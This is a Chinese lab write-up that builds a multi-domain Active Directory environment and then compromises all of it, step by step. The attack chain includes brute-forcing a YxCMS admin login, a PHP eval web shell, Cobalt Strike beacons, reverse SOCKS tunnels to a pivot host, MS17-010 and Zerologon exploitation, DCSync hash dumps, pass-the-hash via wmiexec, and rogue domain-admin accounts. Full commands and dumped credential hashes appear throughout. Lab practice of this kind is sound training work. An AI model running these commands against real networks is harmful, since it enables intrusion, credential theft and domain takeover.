## 一、前言

搭建了二级域，子域和控制域，攻击者可以以WEB服务器作为入口然后攻击子域控制器进而控制整个内网。

本来父域控制器下还有个父域用户，财务域控制器下有个财务核心主机，渗透的截图没有了索性直接删掉了。

网络拓扑如下：

![image-20210825221104852](https://image.3001.net/images/20210826/1629937471_6126df3f143641eb4b6ca.png!small)

## 二、域环境搭建

### （一）父域

用户名| Shandong  
---|---  
IP地址| 10.10.3.2  
域名| shandong.com  
DNS| 10.10.3.2  
备用DNS| 10.10.3.2  
  
创建父域并新建用户：

![image.png](https://image.3001.net/images/20210826/1629937473_6126df412989410ab8eb4.png!small)

![image.png](https://image.3001.net/images/20210826/1629937474_6126df4214e4ed751178b.png!small)

![image.png](https://image.3001.net/images/20210826/1629937475_6126df430403257f00946.png!small)

![image.png](https://image.3001.net/images/20210826/1629937475_6126df43cf3ac7affc881.png!small)

![image.png](https://image.3001.net/images/20210826/1629937476_6126df44b4d11aa46cfdf.png!small)

![image.png](https://image.3001.net/images/20210826/1629937477_6126df45a94c4d4950f10.png!small)

重启后，新建域用户。

![image.png](https://image.3001.net/images/20210826/1629937479_6126df4749fac27c5a230.png!small)

![image.png](https://image.3001.net/images/20210826/1629937480_6126df48c3a72ed33c37d.png!small)

![image.png](https://image.3001.net/images/20210826/1629937481_6126df49b454c6db84e9c.png!small)

![image.png](https://image.3001.net/images/20210826/1629937482_6126df4a67a20e6898bfa.png!small)

![image.png](https://image.3001.net/images/20210826/1629937483_6126df4b208a83b5f2ee1.png!small)

### （二）辅域控制器

用户名| Shandongbak  
---|---  
IP地址| 10.10.3.3  
DNS| 10.10.3.3  
备用DNS| 10.10.3.2  
  
新建辅助域：

![image.png](https://image.3001.net/images/20210826/1629937483_6126df4bde386865284cd.png!small)

![image.png](https://image.3001.net/images/20210826/1629937484_6126df4cc72868c89967e.png!small)

![image.png](https://image.3001.net/images/20210826/1629937485_6126df4da5b22ad4aa3b3.png!small)

![image.png](https://image.3001.net/images/20210826/1629937486_6126df4e85639c02299c2.png!small)

![image.png](https://image.3001.net/images/20210826/1629937487_6126df4f61e5eef975c1a.png!small)

![image.png](https://image.3001.net/images/20210826/1629937488_6126df503c0d1737219d1.png!small)

![image.png](https://image.3001.net/images/20210826/1629937489_6126df512eb379acd63ef.png!small)

### （三）子域控制器

用户名| Jinan  
---|---  
IP地址| 10.10.3.7  
网关地址| 10.10.3.1  
DNS| 10.10.3.4  
备用DNS| 10.10.3.2  
外网地址| 10.10.21.2  
网关地址| 10.10.21.1  
外网DNS地址| 10.10.21.2  
  
创建子域

![image.png](https://image.3001.net/images/20210826/1629937490_6126df5226180b1de6e3c.png!small)

![image.png](https://image.3001.net/images/20210826/1629937490_6126df52f1ad1bb4373b9.png!small)

![image.png](https://image.3001.net/images/20210826/1629937492_6126df5419919417d0417.png!small)

![image.png](https://image.3001.net/images/20210826/1629937492_6126df54e45166e603684.png!small)

### （四）财务域

用户名| Caiwu  
---|---  
IP地址| 10.10.21.3  
网关地址| 10.10.21.1  
DNS| 10.10.21.3  
备用DNS| 10.10.3.2  
财务域IP地址| 172.16.5.2  
网关地址| 172.16.5.1  
财务域DNS地址| 172.16.5.2  
  
![image.png](https://image.3001.net/images/20210826/1629937493_6126df55a49846866e955.png!small)

![image.png](https://image.3001.net/images/20210826/1629937494_6126df56a1a3dfbb2b091.png!small)

![image.png](https://image.3001.net/images/20210826/1629937495_6126df57d5cd2f6bbbdad.png!small)

![image.png](https://image.3001.net/images/20210826/1629937496_6126df589abf54a06227c.png!small)

![image.png](https://image.3001.net/images/20210826/1629937497_6126df59718ccb93c6cb2.png!small)

![image.png](https://image.3001.net/images/20210826/1629937498_6126df5a25454d5219f7f.png!small)

![image.png](https://image.3001.net/images/20210826/1629937498_6126df5ae0e646ce9e0c2.png!small)

![image.png](https://image.3001.net/images/20210826/1629937499_6126df5baedddc1f3d6f0.png!small)

![image.png](https://image.3001.net/images/20210826/1629937500_6126df5c6a50799c98457.png!small)

![image.png](https://image.3001.net/images/20210826/1629937501_6126df5d2e785201c0e6a.png!small)

![image.png](https://image.3001.net/images/20210826/1629937502_6126df5e1259bf167995e.png!small)

![image.png](https://image.3001.net/images/20210826/1629937503_6126df5f275f49d710fed.png!small)

### （五）WEB服务器

用户名| Web-PC  
---|---  
IP地址| 10.10.3.9  
外网IP地址| 192.168.31.160  
  
WEB服务器是子域下的一台主机，用来运行web服务，拥有两个IP地址，连接外网和内网。

![image.png](https://image.3001.net/images/20210826/1629937504_6126df60787b9e08fdc2a.png!small)

创建用户

![image.png](https://image.3001.net/images/20210826/1629937505_6126df61eb5aa460b5170.png!small)

在WEB服务器安装phpstudy并部署yxcms1.2.1用来作为渗透的入口

![image.png](https://image.3001.net/images/20210826/1629937507_6126df6394a6f4536a963.png!small)

环境部署完成后，拓扑结构如下：

![image-20210825221104852](https://image.3001.net/images/20210826/1629937471_6126df3f143641eb4b6ca.png!small)

## 三、对WEB服务器进行渗透

### （一）对网站进行渗透

![image.png](https://image.3001.net/images/20210826/1629937507_6126df6394a6f4536a963.png!small)

使用http://192.168.31.160/index.php?r=admin/index/login，可以进入到网站的后台登录页面。

![image.png](https://image.3001.net/images/20210826/1629937515_6126df6b46ba710ab7f9e.png!small)

使用Burpsuite，对后台登录页面进行爆破

![image.png](https://image.3001.net/images/20210826/1629937516_6126df6c2f4c3d7bcbd46.png!small)

选择字典

![image.png](https://image.3001.net/images/20210826/1629937517_6126df6d0be4ecfd0e320.png!small)

密码1234456 返回的长度与众不同

![image.png](https://image.3001.net/images/20210826/1629937517_6126df6dc08adba0dd484.png!small)

尝试使用123456登录，登录成功

![image.png](https://image.3001.net/images/20210826/1629937518_6126df6ebf02c5a5f0b53.png!small)

YxcmsApp 1.2.1存在漏洞，在前台模板写入 一句话木马 `<?php @eval($_POST['pass']);?>`

![image.png](https://image.3001.net/images/20210826/1629937519_6126df6fdb957fe6bb366.png!small)

![image.png](https://image.3001.net/images/20210826/1629937520_6126df70f1aa8a19b4468.png!small)

![image.png](https://image.3001.net/images/20210826/1629937522_6126df720b07c1214e05c.png!small)

然后使用菜刀，连接一句话木马

![image.png](https://image.3001.net/images/20210826/1629937522_6126df72dde80c119fc48.png!small)

### （二）内网信息收集

![image.png](https://image.3001.net/images/20210826/1629937523_6126df73a38d647e4b3a8.png!small)

查看系统信息

![image.png](https://image.3001.net/images/20210826/1629937524_6126df747a4fc628cfb64.png!small)

查看运行的进程

![image.png](https://image.3001.net/images/20210826/1629937525_6126df755ab8a97106def.png!small)

通过网站查看 运行的进程中有没有杀软

![image.png](https://image.3001.net/images/20210826/1629937526_6126df764346b50cf30c9.png!small)

发现没有杀软

### （三）利用CS提权

在 中间服务器 开启CS的服务端

![image.png](https://image.3001.net/images/20210826/1629937527_6126df773e7a76044c451.png!small)

然后运行客户端

![image.png](https://image.3001.net/images/20210826/1629937528_6126df783dbce60341c40.png!small)

创建监听

![image.png](https://image.3001.net/images/20210826/1629937529_6126df79223e0fac481cb.png!small)

然后生成木马

![image.png](https://image.3001.net/images/20210826/1629937529_6126df79e9c906803f20e.png!small)

![image.png](https://image.3001.net/images/20210826/1629937530_6126df7ab666f83d19270.png!small)

将木马上传到靶机执行。

![image.png](https://image.3001.net/images/20210826/1629937531_6126df7b85c5c15429860.png!small)

执行beacon.exe

![image.png](https://image.3001.net/images/20210826/1629937532_6126df7c44c8fae360bf1.png!small)

可以看到成功上线，而且是管理员权限

![image.png](https://image.3001.net/images/20210826/1629937533_6126df7d04169a3432a73.png!small)

将sleep设置为0

![image.png](https://image.3001.net/images/20210826/1629937533_6126df7ddc89092c1743a.png!small)

![image.png](https://image.3001.net/images/20210826/1629937534_6126df7ea9706e195c0eb.png!small)

使用 插件上传nbtscan，进行内网扫描

![image.png](https://image.3001.net/images/20210826/1629937535_6126df7f80ea586e8005d.png!small)

开始扫描

![image.png](https://image.3001.net/images/20210826/1629937536_6126df808a0d0b8da99ea.png!small)

![image.png](https://image.3001.net/images/20210826/1629937537_6126df817b932fa20bb3c.png!small)

扫描到了四台主机（其实还有两台没有开机，内存不够了(′д｀ )…彡…彡）

![image.png](https://image.3001.net/images/20210826/1629937538_6126df824a7249f9ab3af.png!small)

发现域控是10.10.3.7，下一步 获取域控的权限。

## 四、对子域控制器进行渗透提权

### （一）建立代理

首先上传ew到web服务器（ew不是很稳定，最好还是使用frp）

![image.png](https://image.3001.net/images/20210826/1629937539_6126df83618cafdf45188.png!small)

![image.png](https://image.3001.net/images/20210826/1629937540_6126df848fa6c0564f309.png!small)

在中间服务器上添加一个隧道，把1080端口收到的代理请求转发给888端口

    
    
    ew_for_Win.exe -s rcsocks -l 1080 -e 888
    

![image.png](https://image.3001.net/images/20210826/1629937541_6126df85780fa7e2f0f34.png!small)

通过CS客户端，在目标服务器（Web服务器）上启动SOCKS5服务并反弹到中间服务器的888端口

    
    
    shell ew_for_Win.exe -s rssocks -d 192.168.31.99 -e 888
    

192.168.31.99 是中间服务器的地址

![image.png](https://image.3001.net/images/20210826/1629937542_6126df86327cc3249c57b.png!small)

使用Proxifier测试

![image.png](https://image.3001.net/images/20210826/1629937543_6126df8730495d2235f75.png!small)

代理成功

![image.png](https://image.3001.net/images/20210826/1629937544_6126df88ac80c3ba94a21.png!small)

### （二）使用MSF进攻子域控制器

1、MSF设置隧道代理

    
    
    setg Proxies socks5:192.168.31.99:1080
    setg ReverseAllowProxy true
    

![image.png](https://image.3001.net/images/20210826/1629937545_6126df899a5c0729df07e.png!small)

2、搜索MS17_010模块，使用第1个

![image.png](https://image.3001.net/images/20210826/1629937546_6126df8ab2aeb3dcd8213.png!small)

`set rhosts 10.10.3.7 `（10.10.3.7 ）是之前扫描到的域控的地址

![image.png](https://image.3001.net/images/20210826/1629937548_6126df8c276fb88f96dcc.png!small)

发现域控存在永恒之蓝漏洞，而且系统是 windows 2016

3、使用 ms17_010的command进行攻击

![image.png](https://image.3001.net/images/20210826/1629937549_6126df8d827636c601a82.png!small)

![image.png](https://image.3001.net/images/20210826/1629937551_6126df8f3430aa315fe79.png!small)

攻击成功

### （三）创建域管理员用户

1、创建域控用户

    
    
    set command net user test0327 Abc123! /add /domain
    

![image.png](https://image.3001.net/images/20210826/1629937552_6126df90a5b400eeb3fde.png!small)

2、将用户加入域管理员组

    
    
    set command net group "Domain Admins" test0327 /add /domain
    

![image.png](https://image.3001.net/images/20210826/1629937554_6126df924b0bef658c2ee.png!small)

3、检查用户情况

    
    
    set command net user test0327
    

![image.png](https://image.3001.net/images/20210826/1629937556_6126df9401dfa3d34fde1.png!small)

### （四）创建子域控制器的木马

1、创建中转监听

![image.png](https://image.3001.net/images/20210826/1629937557_6126df95ab4e5ec385ff6.png!small)

![image.png](https://image.3001.net/images/20210826/1629937558_6126df9686a959755b6d7.png!small)

2、生成木马

![image.png](https://image.3001.net/images/20210826/1629937559_6126df9788a7032f10e59.png!small)

![image.png](https://image.3001.net/images/20210826/1629937560_6126df9870213a3d5559d.png!small)

### （五）使用CVE-2020-1472攻击域控

1、首先下载impacket的工具包

`git clone
`[`https://github.com/SecureAuthCorp/impacket.git`](https://github.com/SecureAuthCorp/impacket.git)

    
    
    cd impacket/
    sudo python3 setup.py install
    

2、检查域控administrator-hash的值

（该步骤 主要用于对比hash的值， 实际环境中不知道域控的密码，可以省略该步骤）

    
    
    vim /etc/proxychains.conf
    

![image.png](https://image.3001.net/images/20210826/1629937561_6126df9955d80e5d55a3a.png!small)

kali中 proxychains的配置，使用中间服务器的代理。

    
    
    proxychains impacket-secretsdump jinan.shandong.com/Administrator:'p@ssw0rd'@10.10.3.7 -just-dc-user "JINAN$"
    

![image.png](https://image.3001.net/images/20210826/1629937562_6126df9a4c89ba198f752.png!small)

得到：d8e71d5131bebb8e1e90d1bb2b8d3849

3、验证是否存在漏洞

使用zerologon_tester.py验证是否存在漏洞

`proxychains git clone
`[`https://github.com/SecuraBV/CVE-2020-1472.git`](https://github.com/SecuraBV/CVE-2020-1472.git)

    
    
    cd CVE-2020-1472pip install -r requirements.txt
    

![image.png](https://image.3001.net/images/20210826/1629937563_6126df9b9cb2ac7cdb475.png!small)

    
    
    proxychains python3 zerologon_tester.py JINAN 10.10.3.7
    

![image.png](https://image.3001.net/images/20210826/1629937564_6126df9ca8fca0e2c62df.png!small)

![image.png](https://image.3001.net/images/20210826/1629937565_6126df9dc4af44867b3a4.png!small)

4、CVE-2020-1472 exp

使用 cve-2020-1472-exploit.py将机器账户重置。

下载地址 https://github.com/VoidSec/CVE-2020-1472

`proxychains git clone
`[`https://github.com/VoidSec/CVE-2020-1472`](https://github.com/VoidSec/CVE-2020-1472)

![image.png](https://image.3001.net/images/20210826/1629937567_6126df9f14b2359cdcea6.png!small)

    
    
    proxychains python3 cve-2020-1472-exploit.py -n JINAN$ -t 10.10.3.7
    

![image.png](https://image.3001.net/images/20210826/1629937568_6126dfa04a22326af00ce.png!small)

**注：**如果操作过程中出现如下报错：

AttributeError: module ‘impacket.dcerpc.v5.nrpc’ has no attribute
‘NetrServerPasswordSet2’

重新安装最新版本的impacket

    
    
    git clone https://github.com/SecureAuthCorp/impacketcd impacket
    

`pip install .
（后面有个点，代表当前目录）`![image.png](https://image.3001.net/images/20210826/1629937569_6126dfa14842b30500ff6.png!small)

5、DCSync 导出所有凭据

域控的机器账户可以使用 DCSync 导出域内所有用户的凭据。

进入 impackt/impackt/examples/ 目录下 执行如下命令

    
    
    proxychains impacket-secretsdump -no-pass -just-dc jinan.shandong.com/JINAN\$@10.10.3.7
    

![image.png](https://image.3001.net/images/20210826/1629937571_6126dfa31256597443f3a.png!small)

    
    
    Administrator:500:aad3b435b51404eeaad3b435b51404ee:de26cce0356891a4a020e7c4957afc72:::
    Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
    krbtgt:502:aad3b435b51404eeaad3b435b51404ee:1429dda96aa048808ea054fd10fb9f41:::
    DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
    test0313:1105:aad3b435b51404eeaad3b435b51404ee:823dac660b875ec111137edc8bd4cec0:::
    test0327:1106:aad3b435b51404eeaad3b435b51404ee:4ddec0a4c1b022c5fd8503826fbfb7f2:::
    JINAN$:1000:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
    WEB-PC$:1104:aad3b435b51404eeaad3b435b51404ee:778b992127cbedbef6bbfd36b72bb933:::
    SHANDONG0$:1103:aad3b435b51404eeaad3b435b51404ee:315678ce21517c89e65e2d61b5c53e67:::
    [*] Kerberos keys grabbed
    krbtgt:aes256-cts-hmac-sha1-96:941814e3828089e2de8c6f62f50e43b80137dbc9119adee1b1f078b93f465fbf
    krbtgt:aes128-cts-hmac-sha1-96:8f3182f2c5a4e7362ede6c37c9e41202
    krbtgt:des-cbc-md5:0efb6149628934f1
    test0313:aes256-cts-hmac-sha1-96:842b3c482643d9d10e620e3e7cebeeb953113f3995d7dd9532a605df3e3da53f
    test0313:aes128-cts-hmac-sha1-96:3955abedc5a1f404885999b80c1f655e
    test0313:des-cbc-md5:07da0858dff71002
    test0327:aes256-cts-hmac-sha1-96:0b22713e7609d481293d70238a48aeb112ee35bf14902f55fbcd0f64d0af7467
    test0327:aes128-cts-hmac-sha1-96:f03026b303d24c24af6ce73769a4c8c4
    test0327:des-cbc-md5:830715bf16aea8b6
    JINAN$:aes256-cts-hmac-sha1-96:46ef1468e5f74e53f1da0b28567188ce698a78de8147e23bfa56c540aaf049bf
    JINAN$:aes128-cts-hmac-sha1-96:474ea70427e31fc03518fe7058f09c44
    JINAN$:des-cbc-md5:01fde9c47a047632
    WEB-PC$:aes256-cts-hmac-sha1-96:64b5ba3cdb9e7b5faa1889faec134a5eecdd811b1e66e343e6cb4e05e6f8f3cf
    WEB-PC$:aes128-cts-hmac-sha1-96:3927c4b199fc02bbada6f53b759c4963
    WEB-PC$:des-cbc-md5:76bc6e972649c78a
    SHANDONG0$:aes256-cts-hmac-sha1-96:f972050c17459fb2ba8bb3d006baa730b652ec687b66d199433172b1919a627c
    SHANDONG0$:aes128-cts-hmac-sha1-96:fd14409e9609985facbe071928eaa62d
    SHANDONG0$:des-cbc-md5:0db007256b5b080b
    

得到了所有用户的hash值

6、恢复域机器的账户密码

恢复JINAN$ 机器账户的密码，通过wmic，pass the hash 拿到域控制器的本地管理员权限

`cp /usr/share/doc/python3-impacket/examples/wmiexec.py .`（复制wmiexec.py到到当前目录）

    
    
    chmod +x wmiexec.pyproxychains python3 wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:de26cce0356891a4a020e7c4957afc72 jinan.shandong.com/Administrator@10.10.3.7
    

(aad3b435b51404eeaad3b435b51404ee:de26cce0356891a4a020e7c4957afc72
是administrator 用户的hash 值）

![image.png](https://image.3001.net/images/20210826/1629937573_6126dfa5b9d430f498cdd.png!small)

可以破解出域管密码，使用net结合wmic、schtasks等远程执行命令方法离线获取保存在注册表中的域控凭证，也可以使用imapcket中的远程执行工具通过hash传递获取。当然也可以通过mimikatz在域控上直接获取。

然后分别执行，拷贝本机中SAM数据库到本地端：

 **这个地方要拼手速，一定要快**

    
    
    reg save HKLM\SYSTEM system.savereg save HKLM\SAM sam.savereg save HKLM\SECURITY security.saveget system.saveget sam.saveget security.savedel /f system.savedel /f sam.savedel /f security.save
    

![image.png](https://image.3001.net/images/20210826/1629937575_6126dfa739f15233c6719.png!small)

![image.png](https://image.3001.net/images/20210826/1629937576_6126dfa8df31dc7d08e47.png!small)

7、提取出机器账号的明文hex

执行

    
    
    proxychains impacket-secretsdump -sam sam.save -system system.save -security security.save LOCAL
    

![image.png](https://image.3001.net/images/20210826/1629937578_6126dfaa9a22d12c849d9.png!small)

获得hex值：

    
    
    df3b445599f68c15f1d47038d9f3240e6fcf3779ed75499381c7fe8fbeaa39e9493611c0af97d031bd290d5b104a13e51ffcd54945d85e2ebbd537ce89d366c88561fbf825f89ad44b1a529c13717660c3f9128e72b3a8b33f27cda4fcc6e03cfd00c369bbd11b861ba62b4ddd21cae84fc814ed9ef356e7a49ff385ac5203bc89fcaf9eca3c7aa93de79d801718ee2433cf54aae49e73f674f8a59e308e177a54ba63585a47ba3b74e9215881b489b5a179de0b5aab0128405f57beec71ca693fcbad97777a8e02af142c58ce9d54210127a56a0d7e0ed91defec8d3e253cc332fb56cd7402ca193fdc774406a35c9e
    

8、恢复域机器

注意 机器名 用JINAN@JINAN

    
    
    proxychains python3 restorepassword.py JINAN@JINAN -target-ip 10.10.3.7 -hexpass df3b445599f68c15f1d47038d9f3240e6fcf3779ed75499381c7fe8fbeaa39e9493611c0af97d031bd290d5b104a13e51ffcd54945d85e2ebbd537ce89d366c88561fbf825f89ad44b1a529c13717660c3f9128e72b3a8b33f27cda4fcc6e03cfd00c369bbd11b861ba62b4ddd21cae84fc814ed9ef356e7a49ff385ac5203bc89fcaf9eca3c7aa93de79d801718ee2433cf54aae49e73f674f8a59e308e177a54ba63585a47ba3b74e9215881b489b5a179de0b5aab0128405f57beec71ca693fcbad97777a8e02af142c58ce9d54210127a56a0d7e0ed91defec8d3e253cc332fb56cd7402ca193fdc774406a35c9e
    

**注意 ：****如果没有**
restorepassword.py文件，可以从网上下载，下载地址：https://github.com/dirkjanm/CVE-2020-1472

![image.png](https://image.3001.net/images/20210826/1629937580_6126dfac22c7e217e25bd.png!small)

9、检查情况

恢复密码之后：

![image.png](https://image.3001.net/images/20210826/1629937581_6126dfad1c0e6be7b1264.png!small)

(七) 子域控制器上线CS

可以创建域控组用户、可以利用黄金、白银、PTH、psexec、pth-winexe、wmiexec、smbexec等等技术进行普通域控制！

这里使用一个创建用户的方法：

1、创建一个域管理用户

    
    
    proxychains python3 wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:de26cce0356891a4a020e7c4957afc72 jinan.shandong.com/Administrator@10.10.3.7
    
    
    
    net user biu0327 Abc123! /add /domainnet group "domain admins" biu0327 /add /domain
    

![image.png](https://image.3001.net/images/20210826/1629937582_6126dfae4026c3ef34336.png!small)

2、建立IPC

在子域用户（Web）机器上建立IPC与 子域控制器连接

    
    
    shell net use \\10.10.3.7\ipc$ "Abc123!" /user:biu0327
    

![image.png](https://image.3001.net/images/20210826/1629937583_6126dfaf89aa69dcad8a8.png!small)

    
    
    shell net use
    

![image.png](https://image.3001.net/images/20210826/1629937584_6126dfb03a673e87409cf.png!small)

创建成功

获取权限目录

    
    
    shell dir \\10.10.3.7\c$
    

![image.png](https://image.3001.net/images/20210826/1629937584_6126dfb0e97220fdaa496.png!small)

获取到了 域控制器的目录

上传之前生成的域控制器木马 到 域普通用户（web）

`shell dir`查看

![image.png](https://image.3001.net/images/20210826/1629937585_6126dfb1c101c61d3e66a.png!small)

然后利用IPC 将 beacon-dc.exe 上传到 域控制器

    
    
    shell copy beacon-dc.exe \\10.10.3.7\c$
    

![image.png](https://image.3001.net/images/20210826/1629937586_6126dfb276fcfdafc8c99.png!small)

![image.png](https://image.3001.net/images/20210826/1629937587_6126dfb323c7a5d66f703.png!small)

上传成功

3、执行木马

在中间服务器机器上，利用 wmiexec.exe 执行 子域控制器的beacon-dc.exe

    
    
    wmiexec.exe biu0327:Abc123!@10.10.3.7
    

![image.png](https://image.3001.net/images/20210826/1629937587_6126dfb3df368f5b3b469.png!small)

上线成功！

![image.png](https://image.3001.net/images/20210826/1629937588_6126dfb4b60a32c0f8b59.png!small)

## 五、跨域攻击父域

这里使用域信任关系对父域进行渗透

1、使用mimikatz获取hash

![image.png](https://image.3001.net/images/20210826/1629937589_6126dfb57893430a68abc.png!small)

![image.png](https://image.3001.net/images/20210826/1629937590_6126dfb6552e0fcc610b2.png!small)

![image.png](https://image.3001.net/images/20210826/1629937591_6126dfb7188be2502fd11.png!small)

得到 Administrator的hash ：de26cce0356891a4a020e7c4957afc72

2、利用wmiexec.py，创建用户

在kali中，使用 impackt/example 下的wmiexec.py

    
    
    proxychains python3 ./wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:``de26cce0356891a4a020e7c4957afc72`` SHANDONG.shandong.com/administrator@10.10.3.2
    

(aad3b435b51404eeaad3b435b51404ee
代表administrator的hash，只要用户名是administrator都是该值)

![image.png](https://image.3001.net/images/20210826/1629937592_6126dfb80981639daef52.png!small)

    
    
    net user fu0327 Abc123! /add /domain
    net group "domain admins" fu0327 /add /domain
    

![image.png](https://image.3001.net/images/20210826/1629937593_6126dfb972bb42c95b09d.png!small)

上传木马并执行。 （此处的木马可以与 子域控制器中执行的木马相同）

![image.png](https://image.3001.net/images/20210826/1629937594_6126dfba61d1d813125df.png!small)

上线了 CS

![image.png](https://image.3001.net/images/20210826/1629937595_6126dfbb7104828757a08.png!small)

## 六、对辅助域进行渗透

攻击辅助域，和攻击父域的过程一样

    
    
    proxychains python3 ./wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:``de26cce0356891a4a020e7c4957afc72`` SHANDONGBAK.shandong.com/administrator@10.10.3.3
    

![image.png](https://image.3001.net/images/20210826/1629937596_6126dfbcbcdefa90a5a9a.png!small)

    
    
    net user bak0327 Abc123! /add /domain
    net group "domain admins" bak0327 /add /domain
    

![image.png](https://image.3001.net/images/20210826/1629937598_6126dfbe1805098bee7c2.png!small)

成功上线CS

![image.png](https://image.3001.net/images/20210826/1629937598_6126dfbec6ecfdf1e5dc6.png!small)

## 七、攻击财务域控制器

### （一）信息收集

因为子域控制器，还有一个IP地址，10.10.21.2，上传nbtscan到子域控制器， 对该网段进行扫描

![image.png](https://image.3001.net/images/20210826/1629937599_6126dfbf9010464b8970d.png!small)

![image.png](https://image.3001.net/images/20210826/1629937600_6126dfc087e586c03fa9e.png!small)

发现一台 IP为，10.10.21.3 的域控制器。

### （二）使用Frp 设置二级代理

1、首先在中间服务器上执行

    
    
    [common]
    bind_addr = 0.0.0.0
    bind_port = 7000
    
    

`frps.exe -c frps.ini`

2、在域普通用户（web）上执行

    
    
    # frpc.ini
    [common]
    server_addr = 192.168.31.99
    server_port = 7000
    [http_proxy]
    type = tcp
    local_ip = 10.10.3.9
    local_port = 9999
    remote_port = 9999
    shell frpc.exe -c frpc.ini
    [common]
    bind_addr = 10.10.3.9
    bind_port = 7000
    
    

`shell frps.exe -c frps.ini`

3、在子域控制器上执行

    
    
    # frpc.ini
    [common]
    server_addr = 10.10.3.9
    server_port = 7000
    [http_proxy]
    type = tcp
    remote_port = 9999
    plugin = socks5
    
    

`frpc.exe -c frpc.ini`

4、Proxifier中

![image.png](https://image.3001.net/images/20210826/1629937601_6126dfc18f5039ab60ae5.png!small)

### （三）使用MSF渗透

1、MSF设置代理

    
    
    setg Proxies socks5:192.168.31.99:9999
    setg ReverseAllowProxy true
    

![image.png](https://image.3001.net/images/20210826/1629937602_6126dfc2e3650e4db9010.png!small)

2、使用 msf17_010扫描

![image.png](https://image.3001.net/images/20210826/1629937604_6126dfc421dcc428d4cb3.png!small)

![image.png](https://image.3001.net/images/20210826/1629937605_6126dfc569f9eeaa156b0.png!small)

![image.png](https://image.3001.net/images/20210826/1629937606_6126dfc638f491eff2f66.png!small)

显示为 Windows Server 2008 R2 Standard 7601 Service Pack 1 x64
(64-bit)的系统，并且存在永恒之蓝漏洞

3、使用exp攻击

![image.png](https://image.3001.net/images/20210826/1629937607_6126dfc7768c2eeb47148.png!small)

    
    
    set payload windows/x64/meterpreter/reverse_tcp
    

![image.png](https://image.3001.net/images/20210826/1629937608_6126dfc8c31f53aaca1d1.png!small)

    
    
    net user cai0328 Abc123! /add /domain
    net group "domain admins" cai0328 /add /domain
    

![image.png](https://image.3001.net/images/20210826/1629937610_6126dfca12a2f884a306a.png!small)

![image.png](https://image.3001.net/images/20210826/1629937611_6126dfcbf1f9e5e10b2f7.png!small)

![image.png](https://image.3001.net/images/20210826/1629937613_6126dfcdae001871d6c29.png!small)

![image.png](https://image.3001.net/images/20210826/1629937615_6126dfcf445f7f568912b.png!small)

4、使用cve-2020-1472攻击

    
    
    proxychains python3 zerologon_tester.py CAIWU 10.10.21.3
    

![image.png](https://image.3001.net/images/20210826/1629937616_6126dfd0ae3a0c967901c.png!small)

![image.png](https://image.3001.net/images/20210826/1629937617_6126dfd19e2ffd72c18af.png!small)

    
    
    proxychains python3 cve-2020-1472-exploit.py -n CAIWU$ -t 10.10.21.3
    

![image.png](https://image.3001.net/images/20210826/1629937618_6126dfd29e9c6d5ea994f.png!small)

![image.png](https://image.3001.net/images/20210826/1629937619_6126dfd3bfaf6a161486a.png!small)

    
    
    proxychains impacket-secretsdump -no-pass -just-dc caiwu.com/CAIWU\$@10.10.21.3
    

![image.png](https://image.3001.net/images/20210826/1629937621_6126dfd522636c5449abe.png!small)

    
    
    Administrator:500:aad3b435b51404eeaad3b435b51404ee:de26cce0356891a4a020e7c4957afc72:::
    Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
    krbtgt:502:aad3b435b51404eeaad3b435b51404ee:48e2af7bfb5a5950b8ec1497fcc33:::
    cai0328:1104:aad3b435b51404eeaad3b435b51404ee:4ddec0a4c1b022c5fd8503826fbfb7f2:::
    CAIWU$:1000:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
    CAIWUCORE$:1103:aad3b435b51404eeaad3b435b51404ee:3688100bf5e575715d54c5d94fbc1192:::
    [*] Kerberos keys grabbed
    krbtgt:aes256-cts-hmac-sha1-96:be494aef131d2276a02f801a9691b6dbb44943599643df936c893e06a35960ec
    krbtgt:aes128-cts-hmac-sha1-96:01f881ce84025e8c1ffca192a9b454f1
    krbtgt:des-cbc-md5:0167c2496ef1086d
    cai0328:aes256-cts-hmac-sha1-96:1884c203e4e1ebbb86975f6ba1570fd864d102465bbc94bdd0191e9c94db311d
    cai0328:aes128-cts-hmac-sha1-96:e4e0793d4e7a376034ab85b62a6843a7
    cai0328:des-cbc-md5:3720cee9da15b02f
    CAIWU$:aes256-cts-hmac-sha1-96:afeeb7e76a8ef4e712a718c1c2018d91466f7207b3fabadff2fdc8d28a677
    CAIWU$:aes128-cts-hmac-sha1-96:b313d65b21643141b9093a9f8e0a7726
    CAIWU$:des-cbc-md5:29e3b62a6d6d5b19
    CAIWUCORE$:aes256-cts-hmac-sha1-96:13d69db661edb1f99005c36071240bcc2312893b82216013d08caa3752e68a40
    CAIWUCORE$:aes128-cts-hmac-sha1-96:f33e3a939e3e35114883c1c3e69fa4c6
    CAIWUCORE$:des-cbc-md5:e525165d6b34b30b
    

然后恢复域控制器的密码（此处省略）

使用wmiexec.py 获得shell

    
    
    proxychains python3 wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:de26cce0356891a4a020e7c4957afc72 caiwu.com/Administrator@10.10.21.3
    

在中间服务器上利用 CS生成木马

创建中转

![image.png](https://image.3001.net/images/20210826/1629937622_6126dfd65c13d4bd65407.png!small)

生成木马

![image.png](https://image.3001.net/images/20210826/1629937623_6126dfd72781c37c29447.png!small)

![image.png](https://image.3001.net/images/20210826/1629937624_6126dfd823653a54067c6.png!small)

将生成的木马， 复制到Kali，按照上边的方法利用wmiexec 上传并执行，获得shell

## 八、总结

从搭建域环境到攻击，既熟悉了域环境的搭建，又熟悉了域环境的总体流程。本来域控制器下和财务域控制器下分别还有两台主机的，从上线财务域控制器后面的截图没有了，索性直接给删掉了，学习到的知识还是非常多的。从web渗透、一级代理、二级代理、ms17_010漏洞利用、CVE-2020-1472漏洞利用、IPC、域信任关系、Wimexec使用等等。部分地方攻击过程复杂了，还有许多其他可利用的方法。通过此次渗透会对内网攻击有一个整体的认识。水平有限，努力学习。

